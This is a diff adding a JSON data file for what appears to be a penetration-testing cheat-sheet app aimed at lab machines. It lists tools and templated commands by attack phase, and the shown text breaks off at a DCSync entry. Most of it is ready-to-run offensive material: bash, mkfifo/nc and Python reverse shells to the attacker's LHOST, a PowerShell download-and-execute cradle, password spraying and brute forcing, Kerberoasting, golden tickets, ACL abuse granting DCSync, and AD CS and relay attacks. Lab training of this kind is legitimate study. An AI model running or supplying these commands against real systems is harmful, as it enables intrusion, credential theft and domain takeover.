@@ -1,0 +1,1203 @@
+{
+ "vars": [
+  {
+   "key": "IP",
+   "label": "RHOST / target"
+  },
+  {
+   "key": "DOMAIN",
+   "label": "domain"
+  },
+  {
+   "key": "DC",
+   "label": "DC host / IP"
+  },
+  {
+   "key": "USER",
+   "label": "user"
+  },
+  {
+   "key": "PASS",
+   "label": "pass / NT hash"
+  },
+  {
+   "key": "LHOST",
+   "label": "LHOST (you)"
+  }
+ ],
+ "tools": {
+  "nmap": {
+   "desc": "Network/port scanner and service fingerprinter.",
+   "url": "https://nmap.org/book/man.html"
+  },
+  "rustscan": {
+   "desc": "Very fast port scanner that pipes open ports into nmap.",
+   "url": "https://github.com/RustScan/RustScan"
+  },
+  "ffuf": {
+   "desc": "Fast web fuzzer (dirs, vhosts, params).",
+   "url": "https://github.com/ffuf/ffuf"
+  },
+  "feroxbuster": {
+   "desc": "Recursive content discovery tool.",
+   "url": "https://github.com/epi052/feroxbuster"
+  },
+  "gobuster": {
+   "desc": "Directory/DNS/vhost brute-forcer.",
+   "url": "https://github.com/OJ/gobuster"
+  },
+  "wpscan": {
+   "desc": "WordPress enumeration and vuln scanner.",
+   "url": "https://github.com/wpscanteam/wpscan"
+  },
+  "nxc": {
+   "desc": "NetExec (CrackMapExec successor) — swiss-army knife for SMB/WinRM/LDAP/MSSQL/RDP.",
+   "url": "https://www.netexec.wiki/"
+  },
+  "smbclient": {
+   "desc": "SMB share client (Samba).",
+   "url": "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"
+  },
+  "smbmap": {
+   "desc": "Enumerate SMB shares and permissions.",
+   "url": "https://github.com/ShawnDEvans/smbmap"
+  },
+  "enum4linux-ng": {
+   "desc": "Windows/Samba enumeration (users, shares, policy).",
+   "url": "https://github.com/cddmp/enum4linux-ng"
+  },
+  "rpcclient": {
+   "desc": "MS-RPC client for domain enumeration over SMB.",
+   "url": "https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html"
+  },
+  "ldapsearch": {
+   "desc": "Query LDAP directories.",
+   "url": "https://linux.die.net/man/1/ldapsearch"
+  },
+  "kerbrute": {
+   "desc": "Fast Kerberos user enum and password spraying.",
+   "url": "https://github.com/ropnop/kerbrute"
+  },
+  "impacket": {
+   "desc": "Python toolkit of AD/network protocol scripts.",
+   "url": "https://github.com/fortra/impacket"
+  },
+  "bloodhound": {
+   "desc": "Graphs AD attack paths; collect with bloodhound-python/SharpHound.",
+   "url": "https://bloodhound.specterops.io/"
+  },
+  "certipy": {
+   "desc": "AD CS enumeration and ESC1-16 abuse.",
+   "url": "https://github.com/ly4k/Certipy"
+  },
+  "bloodyAD": {
+   "desc": "AD privilege-escalation swiss army knife (ACL abuse, shadow creds).",
+   "url": "https://github.com/CravateRouge/bloodyAD"
+  },
+  "rubeus": {
+   "desc": "Windows Kerberos abuse (roast, S4U, PtT, golden).",
+   "url": "https://github.com/GhostPack/Rubeus"
+  },
+  "mimikatz": {
+   "desc": "Windows credential and ticket extraction.",
+   "url": "https://github.com/gentilkiwi/mimikatz"
+  },
+  "evil-winrm": {
+   "desc": "WinRM shell for Windows targets.",
+   "url": "https://github.com/Hackplayers/evil-winrm"
+  },
+  "responder": {
+   "desc": "LLMNR/NBT-NS/mDNS poisoner — captures Net-NTLM hashes.",
+   "url": "https://github.com/lgandx/Responder"
+  },
+  "hashcat": {
+   "desc": "GPU password/hash cracker.",
+   "url": "https://hashcat.net/wiki/"
+  },
+  "john": {
+   "desc": "John the Ripper password cracker + *2john tools.",
+   "url": "https://www.openwall.com/john/"
+  },
+  "hydra": {
+   "desc": "Online login brute-forcer.",
+   "url": "https://github.com/vanhauser-thc/thc-hydra"
+  },
+  "powerview": {
+   "desc": "PowerShell AD enumeration (part of PowerSploit).",
+   "url": "https://powersploit.readthedocs.io/en/latest/Recon/"
+  },
+  "chisel": {
+   "desc": "TCP/UDP tunnel over HTTP (pivoting).",
+   "url": "https://github.com/jpillora/chisel"
+  },
+  "ligolo-ng": {
+   "desc": "Modern tunneling/pivoting via a TUN interface.",
+   "url": "https://github.com/nicocha30/ligolo-ng"
+  },
+  "proxychains": {
+   "desc": "Force TCP connections through a proxy chain.",
+   "url": "https://github.com/haad/proxychains"
+  },
+  "linpeas": {
+   "desc": "Linux privesc enumeration script.",
+   "url": "https://github.com/peass-ng/PEASS-ng"
+  },
+  "winpeas": {
+   "desc": "Windows privesc enumeration script.",
+   "url": "https://github.com/peass-ng/PEASS-ng"
+  },
+  "sqlmap": {
+   "desc": "Automatic SQL injection and takeover.",
+   "url": "https://github.com/sqlmapproject/sqlmap"
+  },
+  "netexec": {
+   "desc": "See nxc.",
+   "url": "https://www.netexec.wiki/"
+  },
+  "mitm6": {
+   "desc": "IPv6 DNS takeover for NTLM relay.",
+   "url": "https://github.com/dirkjanm/mitm6"
+  }
+ },
+ "phases": [
+  {
+   "id": "setup",
+   "n": "0",
+   "name": "Setup",
+   "surface": "network",
+   "howto": "Pin your target vars in the bar above, drop the host in /etc/hosts (Kerberos needs the names), and make a working dir. Everything below inherits these values.",
+   "cmds": [
+    {
+     "lbl": "Connect to the lab VPN",
+     "cmd": "sudo openvpn lab.ovpn",
+     "surface": "network"
+    },
+    {
+     "lbl": "Show your VPN IP (LHOST)",
+     "cmd": "ip -4 addr show tun0 | grep -oP '(?<=inet )[0-9.]+'",
+     "surface": "network"
+    },
+    {
+     "lbl": "Add target to /etc/hosts (needed for Kerberos)",
+     "cmd": "echo '{{IP}} {{DOMAIN}} {{DC}}.{{DOMAIN}} {{DC}}' | sudo tee -a /etc/hosts",
+     "surface": "network"
+    },
+    {
+     "lbl": "Fix stalled WinRM/SMB over VPN (MTU)",
+     "cmd": "sudo ip link set dev tun0 mtu 1100",
+     "surface": "network"
+    },
+    {
+     "lbl": "Make a working folder",
+     "cmd": "mkdir -p ~/htb/{{IP}}/nmap && cd ~/htb/{{IP}}",
+     "surface": "network"
+    },
+    {
+     "lbl": "Fix Kerberos clock skew (KRB_AP_ERR_SKEW)",
+     "cmd": "sudo ntpdate {{IP}} || sudo rdate -n {{IP}}",
+     "surface": "ad"
+    }
+   ]
+  },
+  {
+   "id": "recon",
+   "n": "1",
+   "name": "Recon & port scan",
+   "surface": "network",
+   "howto": "Scan all TCP ports fast, then version-scan only the open ones. UDP and vuln scripts are loud — run them when you have time, not first.",
+   "cmds": [
+    {
+     "lbl": "Fast scan of all 65535 TCP ports",
+     "cmd": "nmap -p- --min-rate 10000 -T4 -oN nmap/all {{IP}}",
+     "tool": "nmap"
+    },
+    {
+     "lbl": "Service + default scripts on found ports",
+     "cmd": "nmap -sC -sV -p PORTS -oN nmap/targeted {{IP}}",
+     "tool": "nmap"
+    },
+    {
+     "lbl": "One-shot full scan (-A) to a tee'd log",
+     "cmd": "sudo nmap -sC -sV -T4 -vv {{IP}} | tee nmap/initial",
+     "tool": "nmap"
+    },
+    {
+     "lbl": "Skip host-discovery ping (host drops ICMP)",
+     "cmd": "nmap -Pn -sC -sV {{IP}}",
+     "tool": "nmap"
+    },
+    {
+     "lbl": "Rustscan then auto-nmap",
+     "cmd": "rustscan -a {{IP}} --ulimit 5000 -- -sC -sV",
+     "tool": "rustscan"
+    },
+    {
+     "lbl": "Top UDP ports",
+     "cmd": "sudo nmap -sU --top-ports 100 -oN nmap/udp {{IP}}",
+     "tool": "nmap",
+     "loud": true
+    },
+    {
+     "lbl": "SNMP UDP check",
+     "cmd": "sudo nmap -p161 -sU -sC {{IP}}",
+     "tool": "nmap",
+     "loud": true
+    },
+    {
+     "lbl": "Vuln NSE scripts",
+     "cmd": "nmap --script vuln -oN nmap/vuln {{IP}}",
+     "tool": "nmap",
+     "loud": true
+    }
+   ]
+  },
+  {
+   "id": "web",
+   "n": "2",
+   "name": "Web enumeration",
+   "surface": "web",
+   "howto": "Fingerprint the stack, brute dirs and vhosts, then look for the usual wins: LFI, SSTI, SQLi, exposed git/backups. Filter fuzzing noise with -fs/-fc.",
+   "cmds": [
+    {
+     "lbl": "Directory fuzz (ffuf)",
+     "cmd": "ffuf -u http://{{IP}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic",
+     "tool": "ffuf"
+    },
+    {
+     "lbl": "Recursive dir scan (feroxbuster)",
+     "cmd": "feroxbuster -u http://{{IP}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
+     "tool": "feroxbuster"
+    },
+    {
+     "lbl": "Files with extensions (gobuster)",
+     "cmd": "gobuster dir -u http://{{IP}} -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak",
+     "tool": "gobuster"
+    },
+    {
+     "lbl": "Vhost / subdomain fuzz (set -fs to filter)",
+     "cmd": "ffuf -u http://{{DOMAIN}} -H 'Host: FUZZ.{{DOMAIN}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 0",
+     "tool": "ffuf"
+    },
+    {
+     "lbl": "Fingerprint the stack",
+     "cmd": "whatweb http://{{IP}}",
+     "surface": "web"
+    },
+    {
+     "lbl": "Server misconfig scan",
+     "cmd": "nikto -h http://{{IP}}",
+     "surface": "web",
+     "loud": true
+    },
+    {
+     "lbl": "WordPress scan (users, plugins, themes)",
+     "cmd": "wpscan --url http://{{IP}}/ --enumerate u,ap,vp --api-token TOKEN",
+     "tool": "wpscan"
+    },
+    {
+     "lbl": "Build a wordlist from the site (CeWL)",
+     "cmd": "cewl -d 3 -m 5 -w cewl.txt http://{{IP}}/",
+     "surface": "web"
+    },
+    {
+     "lbl": "LFI: sweep /proc for running cmds & creds",
+     "cmd": "for i in $(seq 1 1000); do curl -s \"http://{{IP}}/index.php?page=/proc/$i/cmdline\" | tr '\\0' ' '; echo \" [$i]\"; done",
+     "surface": "web"
+    },
+    {
+     "lbl": "SSTI quick-detect polyglot (49 in response = injectable)",
+     "cmd": "${{7*7}} {{7*7}} ${7*7} #{7*7}",
+     "surface": "web"
+    },
+    {
+     "lbl": "SQLi: automatic dump of a request",
+     "cmd": "sqlmap -r req.txt --batch --dump",
+     "tool": "sqlmap",
+     "loud": true
+    }
+   ]
+  },
+  {
+   "id": "smb",
+   "n": "3",
+   "name": "SMB / shares",
+   "surface": "windows",
+   "howto": "Try a null/guest session first — Windows boxes leak users, shares and the password policy before you have any creds. Spider readable shares for configs and creds.",
+   "cmds": [
+    {
+     "lbl": "Check creds + host info (NetExec)",
+     "cmd": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASS}}'",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "List shares",
+     "cmd": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASS}}' --shares",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "Null / guest session shares",
+     "cmd": "nxc smb {{IP}} -u 'guest' -p '' --shares",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "List shares (smbclient, null)",
+     "cmd": "smbclient -L //{{IP}}/ -N",
+     "tool": "smbclient"
+    },
+    {
+     "lbl": "Connect to a share",
+     "cmd": "smbclient //{{IP}}/SHARE -U '{{USER}}%{{PASS}}'",
+     "tool": "smbclient"
+    },
+    {
+     "lbl": "Map share permissions",
+     "cmd": "smbmap -H {{IP}} -u '{{USER}}' -p '{{PASS}}'",
+     "tool": "smbmap"
+    },
+    {
+     "lbl": "Recurse SYSVOL for GPP / scripts",
+     "cmd": "smbmap -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} -H {{IP}} -R SYSVOL --dir-only",
+     "tool": "smbmap"
+    },
+    {
+     "lbl": "Full enum (users, shares, policy)",
+     "cmd": "enum4linux-ng -A {{IP}}",
+     "tool": "enum4linux-ng"
+    },
+    {
+     "lbl": "Spider shares for interesting files",
+     "cmd": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASS}}' -M spider_plus",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "Pull GPP cPassword from SYSVOL",
+     "cmd": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASS}}' -M gpp_autologin",
+     "tool": "nxc"
+    }
+   ]
+  },
+  {
+   "id": "services",
+   "n": "4",
+   "name": "Other services",
+   "surface": "network",
+   "howto": "Every open port is an enumeration path. Anonymous FTP, LDAP binds, RPC null sessions, SNMP public strings and NFS exports all routinely hand you users, creds or files.",
+   "cmds": [
+    {
+     "lbl": "FTP anonymous login (user: anonymous)",
+     "cmd": "ftp {{IP}}",
+     "surface": "network"
+    },
+    {
+     "lbl": "LDAP anonymous dump (base DN: example.com -> dc=example,dc=com)",
+     "cmd": "ldapsearch -x -H ldap://{{IP}} -b 'dc=DOMAIN,dc=TLD'",
+     "tool": "ldapsearch"
+    },
+    {
+     "lbl": "LDAP naming contexts (find the base DN)",
+     "cmd": "ldapsearch -x -H ldap://{{IP}} -s base namingcontexts",
+     "tool": "ldapsearch"
+    },
+    {
+     "lbl": "RPC null session",
+     "cmd": "rpcclient -U '' -N {{IP}}",
+     "tool": "rpcclient"
+    },
+    {
+     "lbl": "RPC: enumerate domain users",
+     "cmd": "rpcclient -U '' -N {{IP}} -c 'enumdomusers'",
+     "tool": "rpcclient"
+    },
+    {
+     "lbl": "SNMP walk (public string)",
+     "cmd": "snmpwalk -v2c -c public {{IP}}",
+     "surface": "network"
+    },
+    {
+     "lbl": "SNMP brute community strings",
+     "cmd": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {{IP}}",
+     "surface": "network",
+     "loud": true
+    },
+    {
+     "lbl": "NFS exports",
+     "cmd": "showmount -e {{IP}}",
+     "surface": "network"
+    },
+    {
+     "lbl": "MSSQL client (domain auth)",
+     "cmd": "impacket-mssqlclient {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{IP}} -windows-auth",
+     "tool": "impacket",
+     "surface": "windows"
+    },
+    {
+     "lbl": "DNS zone transfer",
+     "cmd": "dig axfr @{{IP}} {{DOMAIN}}",
+     "surface": "network"
+    }
+   ]
+  },
+  {
+   "id": "creds",
+   "n": "5",
+   "name": "Credential access",
+   "surface": "ad",
+   "howto": "Enumerate valid usernames first (kerbrute won't lock accounts), then spray ONE password across all of them. Watch the lockout policy — spraying blind locks the domain.",
+   "cmds": [
+    {
+     "lbl": "Kerberos user enum (fast, no lockout)",
+     "cmd": "kerbrute userenum -d {{DOMAIN}} --dc {{IP}} users.txt -o valid_users",
+     "tool": "kerbrute"
+    },
+    {
+     "lbl": "Password spray over SMB",
+     "cmd": "nxc smb {{IP}} -u users.txt -p '{{PASS}}' --continue-on-success | grep '[+]'",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "Kerberos password spray",
+     "cmd": "kerbrute passwordspray -d {{DOMAIN}} --dc {{IP}} users.txt '{{PASS}}'",
+     "tool": "kerbrute",
+     "loud": true
+    },
+    {
+     "lbl": "Check the password policy before spraying",
+     "cmd": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASS}}' --pass-pol",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "Validate creds over WinRM",
+     "cmd": "nxc winrm {{IP}} -u '{{USER}}' -p '{{PASS}}'",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "Local (non-domain) auth check",
+     "cmd": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASS}}' --local-auth",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "Pass-the-hash over SMB",
+     "cmd": "nxc smb {{IP}} -u '{{USER}}' -H '{{PASS}}'",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "SSH brute force",
+     "cmd": "hydra -l {{USER}} -P /usr/share/wordlists/rockyou.txt ssh://{{IP}}",
+     "tool": "hydra",
+     "loud": true
+    },
+    {
+     "lbl": "HTTP POST form brute",
+     "cmd": "hydra -l {{USER}} -P rockyou.txt {{IP}} http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'",
+     "tool": "hydra",
+     "loud": true
+    }
+   ]
+  },
+  {
+   "id": "shells",
+   "n": "6",
+   "name": "Reverse shells & TTY",
+   "surface": "linux",
+   "howto": "Catch with a listener first, then pick a payload that matches the target OS. Upgrade to a real PTY immediately so Ctrl-C and tab-complete work.",
+   "cmds": [
+    {
+     "lbl": "Start a listener",
+     "cmd": "rlwrap nc -lvnp 4444",
+     "surface": "linux"
+    },
+    {
+     "lbl": "Bash reverse shell (Linux target)",
+     "cmd": "bash -i >& /dev/tcp/{{LHOST}}/4444 0>&1",
+     "surface": "linux"
+    },
+    {
+     "lbl": "mkfifo reverse shell",
+     "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{LHOST}} 4444 >/tmp/f",
+     "surface": "linux"
+    },
+    {
+     "lbl": "Python reverse shell",
+     "cmd": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{LHOST}}\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\"])'",
+     "surface": "linux"
+    },
+    {
+     "lbl": "PowerShell download + run (Windows target)",
+     "cmd": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}/shell.ps1')\"",
+     "surface": "windows"
+    },
+    {
+     "lbl": "Upgrade to a full TTY",
+     "cmd": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'   # then Ctrl+Z ; stty raw -echo; fg ; export TERM=xterm",
+     "surface": "linux"
+    },
+    {
+     "lbl": "WinRM shell with password",
+     "cmd": "evil-winrm -i {{IP}} -u '{{USER}}' -p '{{PASS}}'",
+     "tool": "evil-winrm",
+     "surface": "windows"
+    },
+    {
+     "lbl": "WinRM shell pass-the-hash",
+     "cmd": "evil-winrm -i {{IP}} -u '{{USER}}' -H '{{PASS}}'",
+     "tool": "evil-winrm",
+     "surface": "windows"
+    },
+    {
+     "lbl": "SYSTEM shell via SMB (psexec)",
+     "cmd": "impacket-psexec {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{IP}}",
+     "tool": "impacket",
+     "surface": "windows",
+     "loud": true
+    },
+    {
+     "lbl": "Quieter exec (wmiexec)",
+     "cmd": "impacket-wmiexec {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{IP}}",
+     "tool": "impacket",
+     "surface": "windows"
+    }
+   ]
+  },
+  {
+   "id": "transfer",
+   "n": "7",
+   "name": "File transfer",
+   "surface": "linux",
+   "howto": "Host from your box, pull from the target. On Windows use certutil/iwr; on Linux wget/curl; or stand up a quick SMB server when HTTP is filtered.",
+   "cmds": [
+    {
+     "lbl": "Serve a folder over HTTP (your box)",
+     "cmd": "python3 -m http.server 80",
+     "surface": "linux"
+    },
+    {
+     "lbl": "Pull a file on Linux target",
+     "cmd": "wget http://{{LHOST}}/linpeas.sh -O /tmp/lp.sh; chmod +x /tmp/lp.sh",
+     "surface": "linux"
+    },
+    {
+     "lbl": "Pull a file on Windows target (certutil)",
+     "cmd": "certutil -urlcache -f http://{{LHOST}}/nc.exe nc.exe",
+     "surface": "windows"
+    },
+    {
+     "lbl": "Pull a file on Windows target (PowerShell)",
+     "cmd": "iwr -uri http://{{LHOST}}/winpeas.exe -outfile winpeas.exe",
+     "surface": "windows"
+    },
+    {
+     "lbl": "Quick SMB server (when HTTP is filtered)",
+     "cmd": "impacket-smbserver share . -smb2support -user u -password p",
+     "tool": "impacket",
+     "surface": "windows"
+    },
+    {
+     "lbl": "Grab a file over that SMB share (Windows)",
+     "cmd": "copy \\\\{{LHOST}}\\share\\nc.exe .",
+     "surface": "windows"
+    },
+    {
+     "lbl": "Base64 a file to paste through a shell",
+     "cmd": "base64 -w0 file; echo; # on target: echo B64 | base64 -d > file",
+     "surface": "linux"
+    }
+   ]
+  },
+  {
+   "id": "ad-enum",
+   "n": "8",
+   "name": "AD enumeration",
+   "surface": "ad",
+   "howto": "Once you have ANY domain creds, collect BloodHound and dump users/groups/ACLs. The graph tells you the shortest path to Domain Admin — don't guess, let it route you.",
+   "cmds": [
+    {
+     "lbl": "BloodHound collection (Linux)",
+     "cmd": "bloodhound-python -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} -ns {{IP}} -c all --zip",
+     "tool": "bloodhound"
+    },
+    {
+     "lbl": "NetExec: enumerate users",
+     "cmd": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASS}}' --users",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "NetExec: enumerate groups",
+     "cmd": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASS}}' --groups",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "NetExec: logged-on users",
+     "cmd": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASS}}' --loggedon-users",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "NetExec: password policy",
+     "cmd": "nxc smb {{IP}} -u '{{USER}}' -p '{{PASS}}' --pass-pol",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "LDAP dump to files (users, groups, computers)",
+     "cmd": "ldapdomaindump -u '{{DOMAIN}}\\\\{{USER}}' -p '{{PASS}}' {{IP}}",
+     "surface": "ad"
+    },
+    {
+     "lbl": "Dump all users' descriptions (creds hide here)",
+     "cmd": "nxc ldap {{IP}} -u '{{USER}}' -p '{{PASS}}' -M get-desc-users",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "Find users with SPN set (kerberoastable)",
+     "cmd": "nxc ldap {{IP}} -u '{{USER}}' -p '{{PASS}}' --kerberoasting kerb.txt",
+     "tool": "nxc"
+    },
+    {
+     "lbl": "PowerView: domain object (on Windows)",
+     "cmd": "Get-Domain",
+     "tool": "powerview",
+     "surface": "windows"
+    },
+    {
+     "lbl": "PowerView: find local-admin access",
+     "cmd": "Find-LocalAdminAccess",
+     "tool": "powerview",
+     "surface": "windows"
+    }
+   ]
+  },
+  {
+   "id": "kerberos",
+   "n": "9",
+   "name": "Kerberos roasting & tickets",
+   "surface": "ad",
+   "howto": "AS-REP roast needs no creds (just a user list) if pre-auth is off. Kerberoast needs any valid creds and targets service accounts. Crack offline, then reuse.",
+   "cmds": [
+    {
+     "lbl": "AS-REP roast (no creds, just users)",
+     "cmd": "impacket-GetNPUsers {{DOMAIN}}/ -usersfile users.txt -no-pass -dc-ip {{IP}} -format hashcat",
+     "tool": "impacket",
+     "when": "pre-auth disabled on an account"
+    },
+    {
+     "lbl": "AS-REP roast a known user",
+     "cmd": "impacket-GetNPUsers {{DOMAIN}}/{{USER}} -no-pass -dc-ip {{IP}}",
+     "tool": "impacket"
+    },
+    {
+     "lbl": "Kerberoast all SPNs (request TGS)",
+     "cmd": "impacket-GetUserSPNs {{DOMAIN}}/{{USER}}:'{{PASS}}' -dc-ip {{IP}} -request -outputfile spns.txt",
+     "tool": "impacket",
+     "when": "you hold any valid domain creds"
+    },
+    {
+     "lbl": "Kerberoast a single account",
+     "cmd": "impacket-GetUserSPNs {{DOMAIN}}/{{USER}}:'{{PASS}}' -dc-ip {{IP}} -request-user sqlsvc",
+     "tool": "impacket"
+    },
+    {
+     "lbl": "Kerberoast from Windows (Rubeus)",
+     "cmd": "Rubeus.exe kerberoast /nowrap /outfile:hashes.txt",
+     "tool": "rubeus",
+     "surface": "windows"
+    },
+    {
+     "lbl": "AS-REP roast from Windows (Rubeus)",
+     "cmd": "Rubeus.exe asreproast /nowrap /format:hashcat",
+     "tool": "rubeus",
+     "surface": "windows"
+    },
+    {
+     "lbl": "Crack a TGS (RC4)",
+     "cmd": "hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt",
+     "tool": "hashcat"
+    },
+    {
+     "lbl": "Crack an AS-REP",
+     "cmd": "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt",
+     "tool": "hashcat"
+    },
+    {
+     "lbl": "Pass-the-ticket: use a .ccache",
+     "cmd": "export KRB5CCNAME=ticket.ccache; impacket-psexec -k -no-pass {{DOMAIN}}/{{USER}}@{{DC}}.{{DOMAIN}}",
+     "tool": "impacket"
+    },
+    {
+     "lbl": "Golden ticket (have krbtgt hash)",
+     "cmd": "impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain {{DOMAIN}} Administrator",
+     "tool": "impacket",
+     "loud": true,
+     "when": "you dumped the krbtgt NT hash"
+    }
+   ]
+  },
+  {
+   "id": "ad-acl",
+   "n": "10",
+   "name": "AD ACL abuse",
+   "surface": "ad",
+   "howto": "BloodHound found an edge (GenericAll / GenericWrite / WriteDACL / WriteOwner / ForceChangePassword / AddSelf). bloodyAD executes most of them in one line. Always note what you changed so you can clean up.",
+   "cmds": [
+    {
+     "lbl": "ForceChangePassword: reset a user's password",
+     "cmd": "bloodyAD -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} --host {{IP}} set password TARGET 'Newp@ss123!'",
+     "tool": "bloodyAD",
+     "when": "GenericAll / ForceChangePassword over a user"
+    },
+    {
+     "lbl": "Add yourself to a group",
+     "cmd": "bloodyAD -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} --host {{IP}} add groupMember 'TARGET GROUP' '{{USER}}'",
+     "tool": "bloodyAD",
+     "when": "GenericAll / GenericWrite / AddSelf over a group"
+    },
+    {
+     "lbl": "Grant yourself DCSync (WriteDACL on domain)",
+     "cmd": "bloodyAD -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} --host {{IP}} add dcsync '{{USER}}'",
+     "tool": "bloodyAD",
+     "when": "WriteDACL on the domain object"
+    },
+    {
+     "lbl": "Take ownership (WriteOwner) then grant rights",
+     "cmd": "bloodyAD -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} --host {{IP}} set owner TARGET '{{USER}}'",
+     "tool": "bloodyAD",
+     "when": "WriteOwner over an object"
+    },
+    {
+     "lbl": "Add a GenericAll ACE after taking ownership",
+     "cmd": "bloodyAD -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} --host {{IP}} add genericAll TARGET '{{USER}}'",
+     "tool": "bloodyAD"
+    },
+    {
+     "lbl": "Shadow Credentials (GenericWrite -> auth as target)",
+     "cmd": "certipy shadow auto -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -account TARGET -dc-ip {{IP}}",
+     "tool": "certipy",
+     "when": "GenericWrite/GenericAll and a 2016+ DC with PKINIT"
+    },
+    {
+     "lbl": "Targeted Kerberoast (GenericWrite -> set SPN)",
+     "cmd": "targetedKerberoast.py -v -d {{DOMAIN}} -u '{{USER}}' -p '{{PASS}}' --dc-ip {{IP}}",
+     "surface": "ad",
+     "when": "GenericWrite over a user"
+    },
+    {
+     "lbl": "PowerView: ForceChangePassword (Windows)",
+     "cmd": "Set-DomainUserPassword -Identity TARGET -AccountPassword (ConvertTo-SecureString 'Newp@ss123!' -AsPlainText -Force)",
+     "tool": "powerview",
+     "surface": "windows"
+    },
+    {
+     "lbl": "PowerView: add to group (Windows)",
+     "cmd": "Add-DomainGroupMember -Identity 'TARGET GROUP' -Members '{{USER}}'",
+     "tool": "powerview",
+     "surface": "windows"
+    }
+   ]
+  },
+  {
+   "id": "adcs",
+   "n": "11",
+   "name": "AD CS (Certipy / ESC)",
+   "surface": "ad",
+   "howto": "Find the CA and vulnerable templates first; Certipy flags the ESC class for you. ESC1 (enrollee supplies subject) is the classic: request a cert as a DA, then auth with it.",
+   "cmds": [
+    {
+     "lbl": "Find CA + vulnerable templates",
+     "cmd": "certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip {{IP}} -vulnerable -stdout",
+     "tool": "certipy",
+     "when": "AD CS is in the domain"
+    },
+    {
+     "lbl": "ESC1: request a cert as another user",
+     "cmd": "certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip {{IP}} -ca CA-NAME -template TEMPLATE -upn administrator@{{DOMAIN}}",
+     "tool": "certipy",
+     "when": "ESC1 — enrollee supplies subject"
+    },
+    {
+     "lbl": "ESC8: relay DC auth to the web enrollment",
+     "cmd": "certipy relay -target 'http://CA-HOST' -template DomainController",
+     "tool": "certipy",
+     "loud": true,
+     "when": "ESC8 — HTTP enrollment + coercion"
+    },
+    {
+     "lbl": "Auth with the cert -> NT hash + TGT",
+     "cmd": "certipy auth -pfx administrator.pfx -dc-ip {{IP}}",
+     "tool": "certipy"
+    },
+    {
+     "lbl": "ESC3/ESC9/ESC13 and more are auto-flagged by find",
+     "cmd": "certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip {{IP}} -vulnerable -enabled",
+     "tool": "certipy"
+    }
+   ]
+  },
+  {
+   "id": "coerce",
+   "n": "12",
+   "name": "Coercion, relay & DCSync",
+   "surface": "ad",
+   "howto": "Force a privileged machine (often the DC) to authenticate to you, relay that to LDAP/AD CS, and you own the domain. DCSync is the endgame once you have replication rights.",
+   "cmds": [
+    {
+     "lbl": "Start the relay to LDAP (RBCD/shadow)",
+     "cmd": "impacket-ntlmrelayx -t ldaps://{{DC}} --delegate-access -smb2support",
+     "tool": "impacket",
+     "loud": true
+    },
+    {
+     "lbl": "PetitPotam coercion (MS-EFSRPC)",
+     "cmd": "python3 PetitPotam.py {{LHOST}} {{IP}}",
+     "surface": "ad",
+     "loud": true,
+     "when": "unauth coercion of the DC"
+    },
+    {
+     "lbl": "PrinterBug / SpoolSample coercion",
+     "cmd": "python3 printerbug.py {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{IP}} {{LHOST}}",
+     "surface": "ad",
+     "loud": true
+    },
+    {
+     "lbl": "mitm6 + relay (IPv6 DNS takeover)",
+     "cmd": "sudo mitm6 -d {{DOMAIN}}",
+     "tool": "mitm6",
+     "loud": true
+    },
+    {
+     "lbl": "Responder (capture Net-NTLMv2)",
+     "cmd": "sudo responder -I tun0 -wf",
+     "tool": "responder",
+     "loud": true
+    },
+    {
+     "lbl": "DCSync a single user (secretsdump)",
